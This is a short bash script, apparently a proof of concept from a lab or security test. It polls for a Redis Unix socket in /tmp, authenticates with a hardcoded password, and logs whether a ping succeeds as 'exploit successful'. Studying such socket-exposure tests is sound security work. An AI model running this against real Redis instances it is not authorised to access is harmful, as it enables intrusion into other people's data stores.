#!/bin/bash

SOCKET="/tmp/redis.sock"
LOGFILE="/tmp/exploit_log.txt"
AUTH_PASS="offer_banner_complexpass"

echo "Starting exploit attempt..." > $LOGFILE

while [ ! -S "$SOCKET" ]; do
    sleep 0.01
done

echo "Socket found. Attempting to connect..." >> $LOGFILE

# Try to authenticate and then ping
RESPONSE=$(redis-cli -s $SOCKET -a $AUTH_PASS ping 2>&1)

if [[ $RESPONSE == "PONG" ]]; then
    echo "Exploit successful: Connected to Redis and received PONG response" >> $LOGFILE
else
    echo "Exploit failed: $RESPONSE" >> $LOGFILE
fi

# docker exec -it db-redis-offer-banner cat /tmp/exploit_log.txt
# Run above command to see the LOGS.
